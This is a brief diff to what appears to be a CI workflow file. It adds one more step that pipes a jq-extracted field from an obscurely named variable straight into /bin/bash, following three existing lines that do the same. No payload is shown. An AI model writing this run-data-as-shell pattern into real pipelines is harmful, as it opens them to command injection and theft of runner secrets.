@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$vdhh28852" | jq -r .a12 | /bin/bash
           printf '%s' "$gbp159" | jq -r .onk18645 | /bin/bash
           printf '%s' "$kt60" | jq -r .slnzg49654 | /bin/bash
+          echo $ymkbi38 | jq -r .d555 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
